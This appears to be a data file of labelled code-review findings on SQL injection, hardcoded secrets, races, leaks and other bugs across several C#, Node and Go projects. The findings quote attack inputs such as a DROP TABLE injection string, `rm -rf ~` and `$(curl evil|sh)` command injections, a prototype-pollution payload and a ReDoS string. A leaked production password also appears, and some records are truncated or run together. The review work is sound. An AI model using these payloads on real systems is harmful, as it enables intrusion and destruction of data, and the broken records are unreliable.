findings.title: Remove hard-coded production database password
findings.body:
The production SQL credentials are committed to source and compiled into the binary. Anyone with repo or assembly access gets prod DB access. TrustServerCertificate=True also disables TLS certificate validation, which allows MITM.

Suggestion: Load the connection string from configuration or a secret store (e.g. IConfiguration / Key Vault), rotate the leaked password, and drop TrustServerCertificate.
findings.label: defect:secret

findings.title: Generate reset tokens from a CSPRNG, not MD5(email+date)
findings.body:
The token is derived only from the email and the current date. An attacker who knows a victim's email can compute it and reset their password (account takeover). It is also valid for the whole day and cannot be revoked.

Suggestion: Use RandomNumberGenerator.GetBytes(32) for the token, store a hash of it with an expiry and user id server-side, and invalidate it after use.
findings.label: defect:md5

findings.title: Handle missing order instead of dereferencing null
findings.body:
FirstOrDefault returns null when the customer has no order with `orderId`. `order.Total` then throws NullReferenceException, which surfaces as a 500 instead of a not-found result.

Suggestion: var order = found.FirstOrDefault(o => o.Id == orderId) ?? throw new KeyNotFoundException($"Order {orderId} not found");
findings.label: defect:nullderef

findings.title: Return Task instead of async void and dispose the reader
findings.body:
With async void, callers cannot await completion or observe exceptions. A parse error crashes the process. The StreamReader is never disposed, so the file handle leaks.

Suggestion: public async Task ImportAsync(string csvPath, CancellationToken ct) { using var reader = new StreamReader(csvPath); ... }
findings.label: defect:asyncvoid

findings.title: Fix data race on shared static Dictionary
findings.body:
Parallel.ForEach mutates a non-thread-safe Dictionary concurrently. The read-modify-write on line 22 loses updates, and concurrent writes can corrupt the dictionary or throw. The static field also accumulates across imports and instances.

Suggestion: Use ConcurrentDictionary.AddOrUpdate, or aggregate per thread and merge, or simply process the rows sequentially.
findings.label: defect:race

findings.title: Reuse HttpClient and avoid blocking on .Result
findings.body:
A new HttpClient per call causes socket exhaustion. This runs once per CSV row inside Parallel.ForEach, so it also floods the rate API. `.Result` blocks threadpool threads and wraps exceptions in AggregateException. Rates are not cached per currency.

Suggestion: Inject a shared HttpClient (IHttpClientFactory), make ToUsdAsync async, and cache rates per currency for the import.
findings.label: defect:dispose

findings.title: Validate CSV rows and parse with invariant culture
findings.body:
Short rows throw IndexOutOfRange. decimal.Parse uses the current culture, so values like "1.50" misparse under comma-decimal locales. Naive Split(',') also breaks on quoted fields.

Suggestion: Check cols.Length, use decimal.Parse(cols[2], CultureInfo.InvariantCulture), and use a real CSV parser.
findings.label: valid

findings.title: URL-encode the currency query parameter
findings.body:
`currency` comes from untrusted CSV data and is interpolated unescaped into the URL. A value containing `&` or `#` can inject extra query parameters.

Suggestion: $"https://rates.example.com/latest?base={Uri.EscapeDataString(currency)}"

findings.title: Fix off-by-one in Window loop bound
findings.label: defect:offbyone

findings.title: Race Condition
findings.body:
`Parallel.ForEach` updates the static `Dictionary` `TotalsByCustomer` from multiple threads with a read-modify-write. `Dictionary` is not thread-safe, so concurrent rows can lose updates, corrupt the dictionary, or throw. Any CSV large enough to run rows in parallel can trigger this, especially when several rows share a customer.

Related problems in the same method:
- `async void` means callers cannot await completion. Exceptions from a missing file, malformed rows (`cols[3]` out of range, `decimal.Parse`), or HTTP failures in `ToUsd` go unobserved or crash the process.
- `StreamReader` is never disposed, so the file handle leaks.
- Each parallel row makes a blocking HTTP call through `RateService.ToUsd`. It creates a new `HttpClient` per call and blocks with `.Result`, which risks socket exhaustion and thread-pool starvation.
findings.label: defect:race

findings.title: Off-by-one
findings.body:
The loop condition `i <= start + size` returns `size + 1` items whenever enough items exist. For example, `Window(items, 0, 10)` returns 11 elements. Use `i < start + size`.

A negative `start` also throws `ArgumentOutOfRangeException` from the indexer. A negative `size` throws from the `List` constructor. Unlike `Page`, neither argument is validated.
findings.label: defect:offbyone

findings.title: Null Dereference
findings.body: `FirstOrDefault` returns null when the customer has no order with `orderId`. `order.Total` then throws `NullReferenceException`. Any unknown or mismatched order id causes this. Handle the not-found case explicitly, for example by returning null or a 404, or by throwing a meaningful exception.
findings.label: defect:nullderef

notes: SQL injection: In `OrdersController.CountMatching`, `customerPrefix` is concatenated directly into the SQL text. An input like `x' OR 1=1; DROP TABLE orders; --` lets an attacker run arbitrary SQL. Use a parameter instead, for example `LIKE @prefix` with the value `prefix + "%"`, and escape LIKE wildcards if needed.

Sensitive information exposure: `src/Data/Db.cs` hardcodes the production SQL Server credentials (`User Id=shop_app;Password=Sh0p!Prod#2026`) in source. It also sets `TrustServerCertificate=True`, which disables certificate validation and enables MITM. The credential should be rotated and loaded from configuration or a secret store.

Insecure password reset token: `PasswordHasher.ResetToken` computes MD5 of `email + yyyyMMdd`, with no secret or randomness. Anyone who knows a user's email can compute that day's valid token and reset the password, which allows account takeover. Use a cryptographically random token (`RandomNumberGenerator`) stored server-side with an expiry and single use, or an HMAC with a server secret.

findings.title: SQL injection via string-concatenated LIKE prefix
findings.body:
`customerPrefix` is concatenated directly into the SQL text. A caller can inject arbitrary SQL, for example `' OR 1=1; DROP TABLE orders; --`. Even without malicious input, `%` and `_` in the prefix act as wildcards. The repository's own FindByCustomerAsync already uses a parameter, so this is inconsistent with it.

Suggestion: var p = cmd.CreateParameter(); p.ParameterName = "@prefix"; p.Value = EscapeLike(customerPrefix) + "%"; cmd.Parameters.Add(p); cmd.CommandText = "SELECT COUNT(*) FROM orders WHERE customer LIKE @prefix ESCAPE '\\'";
findings.label: defect:sqli

findings.title: Production database credentials hardcoded in source
findings.body:
The connection string contains the production host, username and password, so it is committed to version control and baked into every build artifact. Anyone with repo access gets prod DB access, and rotating the password requires a code change. `TrustServerCertificate=True` also disables TLS certificate validation, which allows man-in-the-middle attacks.

Suggestion: Load the connection string from configuration or a secret store (environment variable, Key Vault), rotate the exposed password, and remove TrustServerCertificate.
findings.label: defect:secret

findings.title: Data race on a shared static Dictionary inside Parallel.ForEach
findings.body:
`TotalsByCustomer` is a plain static Dictionary that is read-modify-written from multiple threads. Concurrent writes can corrupt the dictionary, throw, loop forever, or lose updates, and the read-then-add is non-atomic even on a thread-safe map. The static `TotalFor` reader has no synchronization either. In addition, `rates.ToUsd` does a blocking HTTP call per row inside the parallel loop, and `cols[1..3]` throws IndexOutOfRange or FormatException on malformed rows, aborting the whole import. Totals also accumulate across repeated imports because the dictionary is never cleared.

Suggestion: Aggregate per thread, or use ConcurrentDictionary.AddOrUpdate, or process sequentially. Cache rates per currency before the loop and validate each row.
findings.label: defect:race

findings.title: Password reset token is predictable and unauthenticated
findings.body:
The token is MD5(email + current date). It contains no secret, so anyone who knows a victim's email can compute it and take over the account on the same UTC day. It is also not single-use, and MD5 is a broken hash. The comment states that whoever presents the token may set a new password, which makes this an account-takeover vector.

Suggestion: Generate a random token: `Convert.ToHexString(RandomNumberGenerator.GetBytes(32))`. Store only its hash server-side with an expiry, and invalidate it after use.
findings.label: defect:md5

findings.title: async void import method swallows completion and crashes on exceptions
findings.body:
`async void` cannot be awaited, so callers cannot know when the import finishes or whether it failed. Any exception, such as a missing file, a bad row, or a parse error, is raised on the synchronization context or thread pool and can terminate the process.

Suggestion: public async Task ImportAsync(string csvPath, CancellationToken ct = default)
findings.label: defect:asyncvoid

findings.title: New HttpClient per call, blocking .Result, and no caching
findings.body:
Creating an HttpClient per call leaks sockets and can exhaust ports (and does not respect DNS changes). `.Result` blocks a thread and can deadlock under a synchronization context. With no cache, the import makes one remote request per non-USD row. There is no status check, timeout, or handling for a missing "USD" property.

Suggestion: Inject a shared HttpClient or IHttpClientFactory, make the method `async Task<decimal> ToUsdAsync`, cache rates per currency with a TTL, and call EnsureSuccessStatusCode.
findings.label: defect:dispose

findings.title: Off-by-one in Window loop returns size+1 items
findings.body:
The condition `i <= start + size` includes index `start + size`, so up to `size + 1` elements are returned. A negative `start` throws ArgumentOutOfRangeException from the indexer, and `start + size` can overflow for large values.

Suggestion: for (var i = Math.Max(start, 0); i < start + size && i < items.Count; i++)
findings.label: defect:offbyone

findings.title: Block prototype pollution in mergeSettings
findings.body:
Keys are copied recursively with no filtering. A source such as `JSON.parse('{"__proto__":{"isAdmin":true}}')` makes `target.__proto__` resolve to `Object.prototype`, which then gets polluted. Also, an object source value overwriting an existing primitive target value is not handled.

findings.title: Race Condition
findings.body: `reserveUsername` checks `reserved.has(name)`, awaits `checkProfanity`, and only then adds the name. Two concurrent calls with the same name both pass the check before either adds it, so both return `true` and the same username is reserved twice. Reserve the name before the `await` and roll back if the check fails, or track in-flight reservations.
findings.label: defect:race

findings.title: Command Injection
findings.body: `name` is concatenated into a shell command and run with `execSync`. A value like `x; rm -rf ~` or `$(curl evil|sh)` runs arbitrary commands. Use `execFileSync("pdf-render", ["--out", "/tmp/reports", `${name}.pdf`])` and validate or sanitize `name`, which also blocks path traversal.
findings.label: defect:cmdinj

notes: Sensitive information exposure: `src/config.ts` hardcodes a live payments token (`PAYMENTS_API_TOKEN = "tok_live_..."`) in source. It should be revoked and loaded from a secret store or environment variable.
Code injection: `evaluate` in `src/calc.ts` passes `formula` directly to `eval`. Any untrusted input can execute arbitrary JavaScript in the Node process.
Command injection: `exportReport` in `src/export.ts` builds a shell command from `name` (see key issue).

Prototype pollution: `mergeSettings` recursively merges arbitrary keys without blocking `__proto__`, `constructor` or `prototype`. Input such as `JSON.parse('{"__proto__":{"isAdmin":true}}')` pollutes `Object.prototype`.

Weak webhook authentication: `SECRET` falls back to `""` when `WEBHOOK_SECRET` is unset. Anyone can then compute a valid HMAC and forge webhooks. The signature is also compared with `===`, which is not constant-time. Fail closed when the secret is missing and use `crypto.timingSafeEqual`.

ReDoS: the regex `^([a-zA-Z0-9]+\.?)+@example\.com$` in `isValidEmail` has nested quantifiers. A long alphanumeric string that fails to match, e.g. `"a".repeat(40) + "!"`, causes catastrophic backtracking and blocks the event loop.

findings.title: Overflow Bypasses Cap
findings.body: `1 << attempt` overflows for large attempt counts, so the `d > 30` cap never applies. On 64-bit platforms, `attempt` = 63 yields a negative value and `attempt` >= 64 yields 0. A long-running retry loop that keeps incrementing `attempt` would then wait zero or a negative duration and spin without backoff. A negative `attempt` panics at runtime. Clamp `attempt` before shifting, for example by returning 30 when `attempt >= 5` and treating `attempt < 0` as 0.

The old template looked up `$.BeforeCommit $file.OldName` and `$.HeadCommit $file.Name` for every file. That worked for renames.

Now a renamed image has `IsBlobTypeImage == false`, so no image diff is shown. A renamed CSV calls `CreateCsvDiff` with nil blobs.

findings.body:
Both server-side calls use `err = errors.Join(srvHalfCloser.CloseRead())` and `err = errors.Join(srvHalfCloser.CloseWrite())` but omit `err`. Any copy error and any client half-close error collected just above are discarded. Suggestion: err = errors.Join(err, srvHalfCloser.CloseRead())
...
err = errors.Join(err, srvHalfCloser.CloseWrite())

findings.title: Waiting for both directions can hang forever
findings.body:
Previously handleTCP returned on the first finished direction, and the deferred Close calls tore everything down. Now it waits for both copies. Two cases can block the remaining io.Copy indefinitely:
- One direction fails with an error (reset, write failure).
- A side is not a HalfCloser, or its CloseRead/CloseWrite is a silent no-op (sysConn/connWithOneByte return nil when the inner conn can't half-close).

In both cases the peer never gets EOF and no full Close happens. That leaks a goroutine, the backend connection and the client connection per stuck session.

Suggestion: If a direction finishes with a non-nil error, or the relevant side cannot half-close, fully close both srv and c.clientConn to unblock the other copy before waiting for its result. Alternatively, keep returning on first error and only wait for the second direction after a clean EOF where both sides support half-close.
findings.label: defect:d2

findings.title: Unsynchronized readClosed flag
findings.body:
`readClosed` is written in CloseRead and read in Read with no synchronization. net.Conn methods may be called concurrently, and CloseRead is typically invoked to unblock or stop a reader in another goroutine. This is a data race the race detector will flag. Also, a CloseRead issued while a Read is in progress does not interrupt a pending Read that returns the buffered byte.

Suggestion: Use an atomic.Bool for readClosed.
findings.label: nit

findings.title: Errors Discarded
findings.body: `err = errors.Join(srvHalfCloser.CloseRead())` and `err = errors.Join(srvHalfCloser.CloseWrite())` do not include the existing `err`. This overwrites the `io.Copy` error and the client half-close error. Whenever `srv` is a HalfCloser, which is the normal case, copy failures such as "from backend to client" are lost, and `handleTCP` usually returns nil. Use `errors.Join(err, ...)` instead, as in the client branch.
findings.label: defect:d1

findings.title: Possible Hang
findings.body:
`handleTCP` now waits for both copy goroutines before returning, so the deferred `srv.Close()` runs only after both finish. When one direction ends, only a half-close is propagated. The other `io.Copy` stays blocked until that peer closes its side.

If either conn is not a `nettype.HalfCloser`, nothing unblocks the second copy. This happens with a custom `Server.Dialer` returning a non-TCP conn, or with `connWithOneByte` wrapping a non-TCP conn, where the methods are silent no-ops. Previously the first finishing direction tore down both sides. Now the goroutines and connections can leak indefinitely, for example after a backend reset or full close while the client keeps its socket open.

Fall back to fully closing both conns when half-close is unsupported, or after an error in either direction.

findings.title: Waiting for both directions can hang forever
findings.body:
Previously handleTCP returned on the first finished direction, and the deferred Close calls tore everything down. Now it waits for both copies. Two cases can block the remaining io.Copy indefinitely:
- One direction fails with an error (reset, write failure).
- A side is not a HalfCloser, or its CloseRead/CloseWrite is a silent no-op (sysConn/connWithOneByte return nil when the inner conn can't half-close).

In both cases the peer never gets EOF and no full Close happens. That leaks a goroutine, the backend connection and the client connection per stuck session.

Suggestion: If a direction finishes with a non-nil error, or the relevant side cannot half-close, fully close both srv and c.clientConn to unblock the other copy before waiting for its result. Alternatively, keep returning on first error and only wait for the second direction after a clean EOF where both sides support half-close.
findings.label: defect:d2

findings.title: Unsynchronized readClosed flag
findings.body:
`readClosed` is written in CloseRead and read in Read with no synchronization. net.Conn methods may be called concurrently, and CloseRead is typically invoked to unblock or stop a reader in another goroutine. This is a data race the race detector will flag. Also, a CloseRead issued while a Read is in progress does not interrupt a pending Read that returns the buffered byte.

Suggestion: Use an atomic.Bool for readClosed.
findings.label: nit

findings.title: Nil deref after failed Accept in test goroutine
findings.body:
When Accept fails, t.Errorf is called but execution continues. `c.Close` and `c.(*net.TCPConn)` are then evaluated on a nil conn and panic, crashing the whole test binary. The test also never waits for this goroutine, so its t.Errorf calls may run after the test returns.

Suggestion: Return after t.Errorf on Accept failure. Use a done channel and wait for the backend goroutine before the test returns.
findings.label: nit

findings.title: errors.Join drops the accumulated copy error (backend to client)
findings.body:
`err = errors.Join(srvHalfCloser.CloseRead())` omits `err` from the Join, so it overwrites the previous value. The io.Copy error and any `clientHalfCloser.CloseWrite()` error are silently discarded whenever srv is a half-closer, which is the normal case. Real copy failures are therefore not reported.

Suggestion: err = errors.Join(err, srvHalfCloser.CloseRead())
findings.label: defect:d1

findings.title: errors.Join drops the accumulated copy error (client to backend)
findings.body:
Same bug in the other goroutine: `errors.Join(srvHalfCloser.CloseWrite())` replaces `err`, so the client-to-backend io.Copy error and the `clientHalfCloser.CloseRead()` error are lost.

Suggestion: err = errors.Join(err, srvHalfCloser.CloseWrite())
findings.label: defect:d1

findings.title: Waiting for both directions can hang forever after one direction fails
findings.body:
The old code returned on the first finished copy, and the deferred Close calls then unblocked the other goroutine. Now handleTCP waits for both goroutines, but the full Close only runs after the function returns. If one direction fails with a reset or write error, the other can stay blocked in Read on an idle peer. The connection and both goroutines then leak, and the function never returns. Half-close only makes sense after a clean EOF. On error, both conns must be fully closed so the other direction unblocks.

Suggestion: On a non-nil copy error, close both c.clientConn and srv immediately (or use a shared once-closer) before sending to errc. Alternatively, only wait for the second direction after a clean EOF.
findings.label: defect:d2

findings.title: Dropped Error
findings.body: In the backend-to-client goroutine, `err = errors.Join(srvHalfCloser.CloseRead())` overwrites `err` instead of joining it with the existing value. Any error from `io.Copy` or from `clientHalfCloser.CloseWrite()` is silently discarded whenever the server side is a half-closer, which is the normal case. The same bug is in the client-to-backend goroutine with `errors.Join(srvHalfCloser.CloseWrite())`. The fix is `err = errors.Join(err, ...)`.

findings.title: Possible Bug
findings.body: `io.Copy` errors do not unblock the other direction. Previously `return <-errc` returned on the first completion, and the deferred `srv.Close()` tore down both directions. Now `handleTCP` waits for both goroutines. If one direction fails (for example a reset, or a write error to a dead peer), the other direction's `io.Copy` stays blocked on a connection that nothing closes, so the SOCKS handler and its goroutines can hang until the peer closes. On the success path, half-close handles the shutdown. On the error path, the connections should be fully closed so the other copy unblocks.

findings.title: Data Race
findings.body: `readClosed` is written in `CloseRead()` and read in `Read()` without synchronization. In `handleTCP`, `CloseRead` is called from the backend-to-client goroutine while `Read` runs in the client-to-backend goroutine's `io.Copy`, so this is a data race and will be flagged by `-race`. Also, `readClosed` makes `Read` return `net.ErrClosed`, which `io.Copy` reports as an error even though a half-close is expected. It only matters when `CloseRead` is called while a `Read` is in progress.

findings.title: Move retried on 5xx may fail after a server-side success
findings.body:
Move is not idempotent. If the first attempt succeeds server-side but returns 502/504, the retry will find the source missing and fail. The user then sees an error even though the move happened.

Suggestion: Restrict Move retries to 429/503, or on retry check whether the destination already exists before reporting failure.

findings.title: Retrying multipart completion on 5xx may not be idempotent
findings.body:
Complete-multipart is now retried on 500/502/503/504. A gateway timeout or 502 may occur after the server has already finalized the upload. The retry can then fail (e.g. upload ID unknown) and surface an error for an upload that actually succeeded. On the non-OK path the body is also read but never closed before the retry.

Suggestion: Close res.Body on the non-OK path. Consider limiting retries of completion to 429/503, or treat an 'already completed' response on retry as success.

findings.title: Leaked download body on status-based retry
findings.body:
When `downloadRes` has a retryable status and `err` is nil, the closure returns `true, nil` without closing `downloadRes.Body`. The next attempt overwrites `downloadRes`, leaking the connection. If retries are exhausted, the caller receives an error-status response with a nil error.

Each retry overwrites the response, so the earlier body and its connection are leaked. Retries now fire for 500/502/503/504/509 as well as 429, so this is far more likely to happen. If retries are exhausted, the pacer returns a nil error, and the caller then treats the 5xx response as a successful download. Close the body before returning retry=true, and return an error carrying the status so exhausted retries fail.

findings.title: Set content length on retried uploads
findings.body:
`s.f.srv.Call` returns a non-error response for HTTP 4xx/5xx statuses only if the rest client treats them as errors. If `opts.ContentLength` is not set, a fresh `bytes.NewReader` body may be sent chunked, which breaks presigned S3 PUT uploads. Set `ContentLength` explicitly for each attempt so retries send a correct length.

Improved code:
body := chunk.Bytes()
opts.Body = bytes.NewReader(body)
contentLength := int64(len(body))
opts.ContentLength = &contentLength
uploadRes, err = s.f.srv.Call(ctx, &opts)
return shouldRetry(ctx, uploadRes, err)

findings.title: Response body leaked when retrying on a status code
findings.body:
In `Open`, `client.Do(req)` returns a response with a nil error for 429/5xx. The closure then returns `retry=true` without closing `res.Body`, and the next attempt overwrites `res`. This leaks a connection and body on every retry. The change widens the retry set from 429 to include 500/502/503/504/509, so it will happen far more often. If retries are exhausted, the pacer returns a nil error with an error-status `res`, which the caller may then treat as a successful download. The same pattern applies to `downloadRes` in the presigned-URL path.

Suggestion: When the status is retryable, close the body before returning, e.g. `if fserrors.ShouldRetryHTTP(res, retryErrorCodes) { _ = res.Body.Close(); return true, fmt.Errorf("retryable status %d", res.StatusCode) }`. This also ensures a non-nil error is returned if retries are exhausted.

Suggestion: Add `defer res.Body.Close()` after the `err != nil` check, or call `fs.CheckClose` on the body.

findings.title: Wrapper masks optional host interfaces
findings.body:
`hostWrapper` embeds the `component.Host` interface, so only the methods of that interface are promoted. Any other optional capability implemented by the concrete host (`graph.Host`) is no longer visible to extensions that type-assert on the host they receive. Examples include `GetModuleInfos`, `GetFactory`, exposed-exporter lookups and future host capabilities. Only `RegisterZPages` is manually forwarded. Previously extensions got the raw host and these assertions succeeded; now they fail silently and features degrade (e.g. module info reporting, factory lookup). The wrapper also has to be kept in sync by hand with every new host capability.

Suggestion: Forward every optional capability the service host implements (e.g. `GetModuleInfos`, `GetFactory`, and others), or build the wrapper dynamically so it preserves the underlying host's interfaces. Add a test asserting that the wrapper exposes the same optional interfaces as `graph.Host`.
findings.label: defect:d1

findings.title: RegisterZPages is advertised even when unsupported
findings.body:
The wrapper always satisfies the `RegisterZPages` interface, even when the underlying host does not support it. An extension such as zpages that checks for this capability will think registration succeeded while the call is silently a no-op. Before this change it could detect the missing capability and log or error.

Suggestion: Only expose `RegisterZPages` when the wrapped host supports it, e.g. by choosing between two wrapper types at construction time.

findings.title: Hidden host capabilities
findings.body:
`hostWrapper` embeds `component.Host` as an interface, so only `GetExtensions` (plus the explicitly added `Report`/`RegisterZPages`) is promoted. Any other optional capability on the real service host is lost to extensions.

Extensions find these capabilities with type assertions, so they would now fail. Fix: forward these interfaces too, the same way `RegisterZPages` is forwarded. Alternatively, build the wrapper dynamically so it preserves the underlying host's interfaces. Add tests asserting those capabilities still pass through.

findings.body:
`aggregateID := aggregateFor(key.Identity)` is added to `insertWithPasses`, but no other changed line in the function references it. The surrounding code is unchanged context that cannot have used a newly introduced name. Go rejects unused local variables ("declared and not used"), so the package will not build. Suggestion: Either use `aggregateID` where the function still compares identities against 0, or remove the declaration.

findings.title: ID-0 fallback skipped when a specific entry exists, bypassing precedence
findings.body:
The ID-0 fallback only runs when both `policy` and `agg_policy` are NULL. Once `aggregate_for_identity` returns non-zero aggregates, consider a remote ID with a specific allow entry, a missing aggregate entry, and an ID-0 deny or higher-precedence entry. The ID-0 entry is then never consulted, and the specific allow wins even though the precedence rules say the deny should. Either the fallback is unnecessary (userspace expands ID 0 to all aggregates) and should be removed, or it must take part in the precedence comparison the same way `agg_policy` does. As written it is inconsistent with the documented selection rules and will silently diverge from the userspace model.

Suggestion: Drop the fallback and rely on userspace expansion of ID 0 to every aggregate. Otherwise, always do the ID-0 lookup when the aggregate key differs from 0 and choose among all three candidates by precedence and prefix length.

findings.title: Datapath/userspace mismatch
findings.body:
The new ID-0 fallback lookup runs only when both the specific and aggregate lookups miss. It also has no counterpart in the Go `mapState.lookup`, which only considers the specific ID and `aggregateFor(key.Identity)`.

Today `aggregateFor` always returns 0, so this branch never runs and nothing changes. Once aggregates become non-zero, the verdict will depend on whether an unrelated specific entry exists:
- If an ID-0 entry is present (for example, one not expanded via `AllAggregates`) and no specific entry matches, the ID-0 entry is applied.
- If any lower-precedence specific entry exists, the same ID-0 entry is ignored, even a higher-precedence deny.

The userspace test `lookup` will not reflect either case. Either drop the fallback and rely on the expansion of ID 0 into `AllAggregates`, or apply the same precedence logic in both places.

findings.title: Aggregate-key detection via `id == aggregateFor(id)` will break for real aggregates
findings.body:
Several places treat a key as an aggregate key when `key.Identity == aggregateFor(key.Identity)`, e.g. here and at lines 246, 275, 280, 303, 337 and 349. This only works because the stub `aggregateFor` maps 0 to itself. Once `aggregateFor` returns a distinct parent for a non-zero aggregate identity, an aggregate key will not equal its own `aggregateFor`. Those aggregate keys will then be handled as specific identities, so covered child IDs are skipped and the wrong ancestor is used. The same applies to `collectNarrowerPasses`, which compares `k.Identity` with the aggregate of `key` rather than checking `aggregates(k.Identity, key.Identity)`.

Suggestion: Introduce an explicit predicate such as `isAggregate(id)`, and use `aggregates(k.Identity, key.Identity)` when checking coverage instead of comparing against `aggregateFor`.

findings.title: Exceptions in pump()/next() are not caught
findings.body:
Previously the generator's `catch`/`finally` turned a throw from `stream.read()` (e.g. a throwing `_read`, decoder or `then` getter) into a rejected `next()`, and destroyed or detached the stream.

Now, inside `pump()` (which runs as a `.then` callback at line 1534/1598), such a throw becomes an unhandled rejection. The pending `resolve`/`reject` is never called and `inFlight` stays `true`, so the consumer hangs forever and the stream and listeners leak.

In the fast path (line 1575), a throw from `stream.read()` escapes `next()` synchronously, without `finalize()` and without destroying the stream.

Suggestion: Wrap the bodies of `pump()` and the fast path of `next()` in try/catch. On an exception, set `inFlight = false`, call `settleError(err, reject)` (or return `PromiseReject` after `finalize()`), then drain the queue.

findings.title: Queued requests settle before the request that preceded them
findings.body:
`onChunkFulfilled`/`onChunkRejected` call `drain()` before returning or throwing. Queued requests are therefore resolved synchronously, while the earlier request's promise only settles afterwards, when the `then`-derived promise adopts the return value.

After a rejection, a queued `next()` resolves `{done:true}` before the preceding `next()` rejects. Consumers that rely on settlement order (e.g. `Promise.race` or reactions registered on both) observe out-of-order results.

Suggestion: Resolve the current request first, then drain on a later tick, or use explicit resolve/reject as `pump()` does, so the current request settles before queued ones.

findings.title: Sync throw/hang
findings.body:
This affects both the `chunk.then` getter and the `then` call itself.

- **Fast path:** if either throws, `next()` throws synchronously instead of returning a rejected promise. `inFlight` has already been set to `true`, so every later `next()`/`return()`/`throw()` is queued forever and the stream is never finalized or destroyed.
- **Waiting path (`pump()`):** the same throw happens inside a `.then` callback. It becomes an unhandled rejection, and the caller's `next()` promise never settles.

The old generator caught this in its `try` block, which set the error and destroyed the stream. The throw should be caught and routed through `settleError`/`onChunkRejected`.

findings.title: Multi-settling thenable

findings.title: Fast path ignores a reassigned process.env
findings.body:
The old code built the child env from `{ ...process.env }`, reading whatever object `process.env` currently points to. `process.env` is a writable property, and code (test harnesses, sandboxing helpers, `process.env = { ...overrides }`) commonly reassigns it. Children then inherited that object.

The new path calls `getEnvPairs()`, which reads `env->env_vars()` (the real environment or the worker's KVStore) and never looks at the JS `process.env` binding. After `process.env = { FOO: 'x' }`, a `spawn()` with no `env` option now passes the original OS environment instead of `{ FOO: 'x' }`. This silently changes which variables (possibly secrets) the child sees.

Suggestion: Only take the fast path when `process.env` is still the original env proxy, e.g. capture the original object at startup and check `process.env === originalProcessEnv`. Otherwise fall back to the JS copy.
findings.label: defect:d1

findings.title: Unhandled native failure leaves envPairs undefined

Elsewhere, `undefined` is forwarded to the spawn binding as `envPairs`, which no longer guarantees a well-formed array reaches `uv_spawn`.

Suggestion: Make the native side always throw on failure (propagate the pending exception), or check `envPairs === undefined` in JS and fall back to the slow path.

findings.title: Null-byte check skipped
findings.body:
The fast path skips `validateArgumentNullCheck` because the real environment block cannot contain null bytes. `getEnvPairs()` uses the per-`Environment` store, though, and inside a Worker that is a `MapKVStore` (unless `SHARE_ENV` is used).

`MapKVStore::Set` keeps embedded NULs. So in a worker, `process.env.FOO = 'a\0b'` followed by `spawn(cmd)` now behaves differently:
- Before this PR, it threw `ERR_INVALID_ARG_VALUE`.
- Now the value is passed through and silently truncated at the NUL when converted to a C string for `uv_spawn`.

A key containing a NUL is also silently dropped, because `Get(*key_utf8)` looks it up with a truncated `const char*`. The fix is to keep the null check for non-real stores, or to validate in `KVStore::Pairs`.

findings.title: Truncated key lookup

The default `KVStore::Pairs` looks up each key with `Get(*key_utf8)`, which takes a `const char*`. The result is either that the key is skipped, or that the value of a different key (the prefix) is emitted under the full key name.

Using the `Local<String>` `Get` overload, or a length-aware lookup, would avoid this mismatch.

findings.title: Boundary trim now trusts the cursor instead of a structural walk
findings.body:
The old code located the trim target with `locateFragmentEnd(claim.start)`, a walk from the open marker that does not depend on cursor position.

The new `locateClaimedEnd(claim.start)` only walks when `$fe` was never cached. Otherwise it reads `currentHydrationNode` first. When content has already moved the cursor past the boundary's own close, the cursor can be sitting on an enclosing `]`. The new comment in `locateClaimedEnd` acknowledges this case: a fragment claiming the close as its anchor, or `advanceHydrationNode` climbing to the parent.

If that enclosing close is accepted:
- `trimHydrationBoundary` sees `node === close` and skips the trim, leaving unclaimed SSR nodes in place.
- If the result gets cached on `start.$fe`, `locateEndAnchor`/`locateSlotEndAnchor` will later return the wrong marker for this range.

Suggestion: Use the structural walk for the boundary's own range, e.g. `trimHydrationBoundary(claim.start ? locateEndAnchor(claim.start) : null)`. `locateEndAnchor` is cached, so this is cheap after the first call.
findings.label: valid

findings.title: Slot anchor reuse switched from walk-located close to cursor-based lookup
findings.body:
For `SLOT` fragments the anchor used to be `currentSlotEndAnchor`, which a walk located up front. It now comes from `locateClaimedEnd(currentSlotClaim.start)`.

When the boundary's `$fe` has not been cached yet, this consults the cursor. If the cursor rests on a close of the same kind belonging to an enclosing range, the slot can reuse or create its anchor after the wrong marker. The same cursor ambiguity applies as in the boundary trim.

Suggestion: For the slot case use `locateSlotEndAnchor()` (the cached walk), and keep `locateClaimedEnd` for `frag.hydrationClaim`.
findings.label: valid

findings.title: Cached `$fe` returned without checking the node is still attached
findings.body:
`locateClaimedEnd` now returns `start.$fe` without checking that the node is still attached. Mismatch recovery (`removeFragmentNodes`, `cleanupHydrationTail`) can detach nodes after the close was cached. If that happens, the stale `$fe` is passed to `trimHydrationBoundary` or used as an insertion anchor.

For a detached `close`, `compareDocumentPosition` returns DISCONNECTED with implementation-defined ordering. The trim may then walk `cleanupHydrationTail` looking for a node it will never reach.

Suggestion: Validate the cache before returning it, e.g. `if (start.$fe && start.$fe.parentNode === start.parentNode) return start.$fe`, otherwise fall through to the cursor check and walk.

findings.title: Unguarded null trim
findings.body:
`trimHydrationBoundary` used to run only when a close marker was found (`if (close)`). It is now always called, and receives `null` when `claim.start` is missing or `locateClaimedEnd` finds no close. That happens when the boundary has no SSR range, for example on a hydration mismatch where the opening marker isn't found.

I can't see from the diff whether `trimHydrationBoundary(null)` is a no-op. If it treats `null` as "trim to the end of the parent", which is a common `cleanupHydrationTail` pattern, it could remove unrelated trailing SSR siblings.

Suggested fix: keep the guard, e.g. `const close = claim.start ? locateClaimedEnd(claim.start) : null; if (close) trimHydrationBoundary(close)`. A mismatch test where the slot has no SSR markers would confirm the behavior.

findings.title: Stale cached close

If mismatch handling later removes or replaces that close node, the cached `$fe` would be detached. `planReuseOwnClose` or the boundary trim would then use a node with no `parentNode`. The old code never read a cache here.

Uncertain: this depends on whether the mismatch paths can remove the close node while `$fe` is set. A mismatch test covering deferred revival inside a slot would settle it.

findings.title: Avoid cursor-based close lookup for slots
findings.body:

findings.title: kMaxConcurrentStreams no longer initialized
findings.body:
The `this[kMaxConcurrentStreams] = ...` assignment was removed, but the symbol is still imported here and in client-h2.js. findings.title: initialWindowSize reads from a different key than the one validated and documented
findings.body:
Validation (lines 236-238) and the docs use `h2Options.settings.initialWindowSize`, but the value is read from `h2Options.initialWindowSize`, which is neither validated nor documented. A user following the docs and setting `settings.initialWindowSize` is silently ignored, and the value falls back to 262144. A user setting `h2Options.initialWindowSize` bypasses validation entirely. In addition, `h2Options.settings` is never passed to `http2.connect` in client-h2.js, so the documented `settings` option has no effect.

